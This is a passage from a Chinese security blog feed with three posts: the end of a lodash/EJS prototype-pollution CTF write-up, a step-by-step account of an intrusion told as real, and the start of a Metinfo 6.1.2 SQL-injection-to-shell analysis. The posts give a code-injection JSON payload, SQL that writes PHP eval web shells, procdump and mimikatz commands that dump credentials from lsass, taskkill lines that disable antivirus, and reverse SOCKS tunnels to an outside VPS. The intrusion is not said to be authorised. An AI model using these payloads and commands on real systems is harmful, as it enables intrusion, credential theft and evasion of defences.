class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exports.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.shift();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line">  </span><br><span class="line">. . .  . . . </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着调用 tryHandleCache 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  <span class="keyword">if</span> (!cb) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> exports.promiseImpl == <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> exports.promiseImpl(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          result = handleCache(options)(data);</span><br><span class="line">          resolve(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          reject(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Please provide a callback function'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> cb(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cb(<span class="literal">null</span>, result);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大体就是经过 handleCache 函数处理后返回最终的页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  . . .   . . . </span><br><span class="line"></span><br><span class="line">  func = exports.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    exports.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进 compile 看到各种代码拼接 </p><p><img src="https://i.loli.net/2019/09/10/YJ4cBru9w7hMZA1.png" alt></p><p>可以利用 outputFunctionName 通过原型链污染注入恶意代码，</p><p>注意 server.js 中这一行 <code>app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())</code>，服务器会解析我们发送的 JSON 数据</p><p>通过 constructor 方法给原型加上我们“污染“后的 outputFunctionName 属性</p><p>Payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"111"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"__append; return process.env.FLAG; __append"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>最终更改 <code>Content-Type: application/json; charset=UTF-8</code> 发送 Payload 执行 /add 操作 5 次，再通过访问 /get 利用 lodash 漏洞进行原型链污染，再回到首页即可返回 flag</p><p><img src="https://i.loli.net/2019/09/12/4VsQlJ6gAHjimny.png" alt></p><p>Reference:</p><p><a href="https://blog.szfszf.top/tech/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%88%86%E6%9E%90/</a></p><p><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-6</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaScript 原型链污染" scheme="http://j0k3r.top/tags/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>记一次真实的内网渗透</title>
    <link href="http://j0k3r.top/2019/09/03/Intranet_Penetration/"/>
    <id>http://j0k3r.top/2019/09/03/Intranet_Penetration/</id>
    <published>2019-09-02T16:00:00.000Z</published>
    <updated>2019-09-13T07:23:39.955Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><p>直接弱口令进入 phpmyadmin，满满的都是敏感数据</p><p><img src="https://i.loli.net/2019/09/05/fGDN5ybPY74lBqJ.png" alt></p><p>先收集一下信息</p><h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>MySQL 版本: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version;</span><br><span class="line">5.5.25a</span><br></pre></td></tr></table></figure><p>OS 版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version_compile_os</span><br><span class="line">win32</span><br></pre></td></tr></table></figure><p>MySQL 绝对路径, 可借此推测 web 路径: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@basedir </span><br><span class="line">D:/xampp/mysql</span><br></pre></td></tr></table></figure><p>看能不能利用 phpmyadmin 报错，爆 web 根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpMyAdmin/index.php?lang[]=1</span><br><span class="line">/phpMyAdmin/phpinfo.php</span><br><span class="line">/phpmyadmin/themes/darkblue_orange/layout.inc.php</span><br><span class="line">/phpmyadmin/libraries/select_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/mcrypt.lib.php</span><br></pre></td></tr></table></figure><p>查看数据导入和导出限制，若其值为 NULL，则不允许导入导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &apos;secure_file_priv&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF( (</span><br><span class="line">SELECT  `VARIABLE_VALUE` </span><br><span class="line">FROM  `GLOBAL_VARIABLES` </span><br><span class="line">WHERE  `VARIABLE_NAME` =  &apos;secure_file_priv&apos; = NULL</span><br><span class="line">),  &apos;Yes&apos;,  &apos;no&apos; )</span><br></pre></td></tr></table></figure><p>官方文档：</p><blockquote><p>secure_file_priv may be set as follows:</p></blockquote><blockquote><p>If empty, the variable has no effect. This is not a secure setting.</p></blockquote><blockquote><p>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server will not create it.</p></blockquote><blockquote><p>If set to NULL, the server disables import and export operations.</p></blockquote><p>secure_file_priv 这个值为只读变量，只能通过配置文件修改. </p><ul><li><p>如果为空，变量无效。</p></li><li><p>如果设置为目录名，服务器将导入和导出操作限制为仅处理该目录中的文件。目录必须存在；服务器不会创建它。</p></li><li><p>如果设置为空，服务器将禁用导入和导出操作。</p></li></ul><p>修改方法： 在mysql 配置文件的 [mysqld] 内加入secure_file_priv</p><h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h2><p>很幸运，这里 secure_file_priv 的值是空，但是还不知道 web 根目录，无法确定 shell 路径，不过根据上面获取的 <code>@@basedir</code> 再根据网站域名盲猜一下成功读取到写入的测试文件</p><p><img src="https://i.loli.net/2019/09/05/XhTMVL4NHEj7PeD.png" alt></p><p><code>into outfile</code> 写 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT  &apos;&lt;?php @eval($_REQUEST[1]); ?&gt;&apos;</span><br><span class="line">INTO OUTFILE  &apos;D:/xampp/root path/setting_sys.php&apos;</span><br></pre></td></tr></table></figure><p>如果 secure_file_priv 的值为 NULL，在数据导入导出限制的情况下可以利用 log 日志写 shell，条件是需要 mysql 的 root 用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;; # 开启 </span><br><span class="line">SET global general_log_file=&apos;/web root path/eval.php&apos;;</span><br><span class="line">select &apos;&lt;?php eval($_REQUEST[1]); ?&gt;&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/92dDqFX1CJpKRkr.png" alt></p><h2 id="0x03-深入"><a href="#0x03-深入" class="headerlink" title="0x03 深入"></a>0x03 深入</h2><p><code>net config Workstation</code> // 获取当前计算机名，全名，用户名，系统版本，工作站域，登陆域</p><p><img src="https://i.loli.net/2019/09/05/bcED1dQ7S4xWVRA.png" alt></p><p>Administrator 很舒服，但是 <code>tasklist /svc</code> 列进程能够看到 ZhuDongFangYu.exe 和 多个 360*.exe</p><p>调整下蚁剑的超时时间，不然稍大一点的文件就很难传上去了</p><p><img src="https://i.loli.net/2019/09/03/FUXMPpIfKvlGCgE.png" alt></p><p>pwdump7 抓 Administrator 的 hash</p><p><img src="https://i.loli.net/2019/09/03/DJpVIFTGSsvXgAO.png" alt></p><p>其中</p><p>用户名称为：Administrator<br>RID为：500 后面跟着 LM-HASH值 和 NT-HASH值</p><p>拿着 hash 去 <a href="https://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">Objectif Sécurité - Ophcrack</a>, cmd5 之类的网站爆一波</p><p><img src="https://i.loli.net/2019/09/03/uiA5rOnjkNJ8VbP.png" alt></p><p>奈何破解不了</p><p>想到 p0desta 表哥一篇 <a href="http://p0desta.com/2019/07/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">记一次有趣的渗透</a> </p><p>使用官方免杀的 procdump.exe 导出lsass进程的内存数据，再配合 mimikatz 本地抓取密码</p><p><code>procdump.exe -accepteula -ma lsass.exe -o crack.dmp</code></p><p><img src="https://i.loli.net/2019/09/03/trSMQ8ia1CT4Khm.png" alt></p><p>下载下来，拿出封存已久的 mimikatz</p><p>抓取密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">mimikatz # sekurlsa::minidump crack.dmp</span><br><span class="line">mimikatz # sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/03/sv3r7dxbUpmgljQ.png" alt></p><p>这就拿到了 Administrator 的密码，因为这个 windows 只有一个内网 IP，但是发现开了 3389，外部虽无法直接连接，但是可以通过端口转发建立代理连接</p><p><img src="https://i.loli.net/2019/09/05/8PYEFTUVWgiZtLb.png" alt></p><h4 id="几个代理工具"><a href="#几个代理工具" class="headerlink" title="几个代理工具"></a>几个代理工具</h4><p><strong>1. lcx &amp; portmap</strong></p><p>windows:</p><p><code>lcx.exe -slave vps 7777 127.0.0.1 3389</code></p><p>vps:</p><p><code>./portmap -m 2 -p1 7777 -p2 8888</code></p><p>会被 360 查杀</p><p><strong>2. EarthWorm</strong></p><p>windows:</p><p><code>ew_for_Win.exe -s rssocks -d 152.136.210.126 -e 8888</code></p><p>vps:</p><p><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></p><p>这个 ew_for_linux64 会被腾讯云标记为木马文件，ew_for_Win.exe 测试在这个装有 360 的机器上运行直接被删掉</p><p><strong>3. reGeorg</strong></p><p>放上 tunnel.nosocket.php 后进行连接，或者是用这个PHP 一句话版 <a href="https://github.com/zsxsoft/reGeorg" target="_blank" rel="noopener">reGeorg for PHP One-line Shell</a>，接着本地用 proxifier 配置 socks 代理</p><p>然后它就卡在了这个地方，接着自动退出，有空再分析下原因</p><p><img src="https://i.loli.net/2019/09/05/tLTyaMn849f2igs.png" alt></p><p>这里 lcx、EarthWorm 都遭到了 360 的拦截，网上的免杀 Lcx.exe 也无济于事，reGeorg 也不能很好的工作</p><p>使用 taskkill 结束 360 相关进程，但是一般来说 ZhuDongFangYu.exe 和 360 部分进程还是杀不掉的，需在 360 设置里手动关闭，用 ntsd.exe 也不行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /im 360* /t /f</span><br><span class="line">taskkill /im ZhuDongFangYu.exe /t /f</span><br></pre></td></tr></table></figure><p><strong>sSocks</strong></p><p>360 还是有漏网之鱼，最终使用 ssocks 成功建立代理。。</p><blockquote><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。官方地址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a></p></blockquote><p>vps:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://phoenixnap.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz</span><br><span class="line"> tar -zxf ssocks-0.0.14.tar.gz</span><br><span class="line"> cd ssocks-0.0.14</span><br><span class="line"> ./configure &amp;&amp; make</span><br><span class="line"> cd src</span><br><span class="line"> ./rcsocks -l 1080 -p 1234 -v</span><br></pre></td></tr></table></figure><p>windows 7:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rssocks.exe -s vps:1234</span><br></pre></td></tr></table></figure><p>在本地使用 socks 代理工具配置代理, 成功</p><p><img src="https://i.loli.net/2019/09/04/ITVtcFPjnkbrzCx.png" alt></p><p>这台机器只有一个 工作站域 WorkGroup</p><p><code>net view /domain</code> 查看也只有 WORKGROUP </p><p><code>net view</code> //用来查看跟本机有关联的机器名</p><p><img src="https://i.loli.net/2019/09/04/nOjIKQucVm9ZS54.png" alt></p><p>有个 GAOJIGUANLIYUAN</p><p>不知怎么的，这机器上并没有 nbtstat，先 <code>arp -a</code> 列出本网段内所有活跃的IP地址，IP 不多，屈指可数，再通过 <code>ping -n 1 -a ip</code> 查看 ip 的机器名，成功找的 GAOJIGUANLIYUAN 的 ip 地址</p><p><img src="https://i.loli.net/2019/09/04/aIMAiqRp3o6QczU.png" alt></p><p>该机还装有 TeamViewer，连接列表其中一个远程主机还有一个没有密码的非管理员账户</p><p><img src="https://i.loli.net/2019/09/04/UHMiRyjWaLXPvlO.png" alt></p><p>然后神奇的发现那个 GAOJIGUANLIYUAN 不见了，比较遗憾 (第二天又有了，难道当时下班了？)</p><p>采用编译的方式安装 proxychains 代理 nmap 对远程内网主机进行扫描，这里有个坑，如果用 brew 安装的 proxychains 会出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rofl0r/proxychains-ng</span><br><span class="line">cd proxychains-ng</span><br><span class="line">./configure --prefix=/usr/local --bindir=/usr/local/bin --libdir=/usr/local/lib --fat-binary</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/05/M4zDk3b8NA6GHiU.png" alt></p><p>看样子可以使用 <code>MS17_010</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://j0k3r.top/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo 6.1.2 从 SQL 注入到 GetShell 复现&amp;分析</title>
    <link href="http://j0k3r.top/2019/05/01/Metinfo612/"/>
    <id>http://j0k3r.top/2019/05/01/Metinfo612/</id>
    <published>2019-04-30T16:00:00.000Z</published>
    <updated>2019-05-02T11:34:32.160Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><p>基于 Metinfo 6.1.2，源码可到 <a href="https://www.metinfo.cn/download/" target="_blank" rel="noopener">https://www.metinfo.cn/download/</a> 下载</p><p>位于 app/system/include/class/web.class.php 468 行开始的 web 类的析构函数中存在任意文件写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="comment">//读取缓冲区数据</span></span><br><span class="line">$output = str_replace(<span class="keyword">array</span>(<span class="string">'&lt;!--&lt;!----&gt;'</span>,<span class="string">'&lt;!----&gt;'</span>,<span class="string">'&lt;!--fck--&gt;'</span>,<span class="string">'&lt;!--fck'</span>,<span class="string">'fck--&gt;'</span>,<span class="string">''</span>,<span class="string">"\r"</span>,substr($admin_url,<span class="number">0</span>,<span class="number">-1</span>)),<span class="string">''</span>,ob_get_contents());</span><br><span class="line">ob_end_clean();<span class="comment">//清空缓冲区</span></span><br><span class="line">$output = <span class="keyword">$this</span>-&gt;video_replace(<span class="string">'/(&lt;video.*?edui-upload-video.*?&gt;).*?&lt;\/video&gt;/'</span>, $output);</span><br><span class="line">$output = <span class="keyword">$this</span>-&gt;video_replace(<span class="string">'/(&lt;embed.*?edui-faked-video.*?&gt;)/'</span>, $output);</span><br><span class="line">       <span class="keyword">if</span>($_M[<span class="string">'config'</span>][<span class="string">'met_qiniu_cloud'</span>]) &#123;</span><br><span class="line">           $output = load::plugin(<span class="string">'dofooter_replace'</span>, <span class="number">1</span>, <span class="keyword">array</span>(<span class="string">'data'</span> =&gt; $output));</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 标签数据处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">load::sys_class(<span class="string">'view/ui_compile'</span>);</span><br><span class="line">$ui_compile = <span class="keyword">new</span> ui_compile();</span><br><span class="line">$output = $ui_compile-&gt;replace_attr($output);</span><br><span class="line"><span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'html_filename'</span>] &amp;&amp; $_M[<span class="string">'form'</span>][<span class="string">'metinfonow'</span>] == $_M[<span class="string">'config'</span>][<span class="string">'met_member_force'</span>])&#123;</span><br><span class="line">$filename = urldecode($_M[<span class="string">'form'</span>][<span class="string">'html_filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS,<span class="string">"WIN"</span>)) &#123;</span><br><span class="line">$filename = @iconv(<span class="string">"utf-8"</span>, <span class="string">"GBK"</span>, $filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($filename, <span class="string">'.php'</span>))&#123;</span><br><span class="line">jsoncallback(<span class="keyword">array</span>(<span class="string">'suc'</span>=&gt;<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents(PATH_WEB.$filename, $output))&#123;</span><br><span class="line">jsoncallback(<span class="keyword">array</span>(<span class="string">'suc'</span>=&gt;<span class="number">1</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">jsoncallback(<span class="keyword">array</span>(<span class="string">'suc'</span>=&gt;<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $output;<span class="comment">//输出内容</span></span><br><span class="line">&#125;</span><br><span class="line">DB::close();<span class="comment">//关闭数据库连接</span></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中不难看出，若满足 <code>$_M[&#39;form&#39;][&#39;html_filename&#39;] &amp;&amp; $_M[&#39;form&#39;][&#39;metinfonow&#39;] == $_M[&#39;config&#39;][&#39;met_member_force&#39;]</code>，则 ob_get_contents（） 即输出缓冲区中的内容会被写入文件</p><p>而 met_member_force 在安装的时候就被写入了数据库，从 <code>/install/index.php</code> 能看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">. . . . </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span><span class="params">($i)</span></span>&#123;</span><br><span class="line">  $str = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">  $finalStr = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$i;$j++)</span><br><span class="line">  &#123;</span><br><span class="line">    $finalStr .= substr($str,mt_rand(<span class="number">0</span>,<span class="number">25</span>),<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $finalStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. . . . </span><br><span class="line"></span><br><span class="line">$force =randStr(<span class="number">7</span>);</span><br><span class="line">$query = <span class="string">" UPDATE $met_config set value='$force' where name='met_member_force'"</span>;</span><br><span class="line">mysqli_query($link , $query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'写入数据库失败: '</span> . mysqli_error($link));</span><br></pre></td></tr></table></figure><p>但是我们可以通过 sql 注入获取，在 app\system\message\web\message.class.php 中第43行，<code>{$_M[form][id]}</code> 被直接拼到 sql 语句中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="keyword">if</span>(!$_M[form][id])&#123;</span><br><span class="line">          $message=DB::get_one(<span class="string">"select * from &#123;$_M[table][column]&#125; where module= 7 and lang ='&#123;$_M[form][lang]&#125;'"</span>);</span><br><span class="line">          $_M[form][id]=$message[id];</span><br><span class="line">&#125;</span><br><span class="line">$met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' andcolumnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">       $_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line"><span class="keyword">if</span>(!$_M[config][met_fd_ok])okinfo(<span class="string">'javascript:history.back();'</span>,<span class="string">"&#123;$_M[word][Feedback5]&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line"><span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]))&#123;</span><br><span class="line"> okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">    . . . . </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于 message 继承自系统一级基类 common，其构造函数首先就对表单进行了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;<span class="comment">//全局数组$_M</span></span><br><span class="line">ob_start();<span class="comment">//开启缓存</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_mysql();<span class="comment">//数据库连接</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_form();<span class="comment">//表单过滤</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_lang();<span class="comment">//加载语言配置</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_config_global();<span class="comment">//加载全站配置数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_url_site();</span><br><span class="line"><span class="keyword">$this</span>-&gt;load_config_lang();<span class="comment">//加载当前语言配置数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_url();<span class="comment">//加载url数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时如果我们直接在留言页面进行 sql 注入会被 common.func.php 中的 sqlinsert 函数所过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 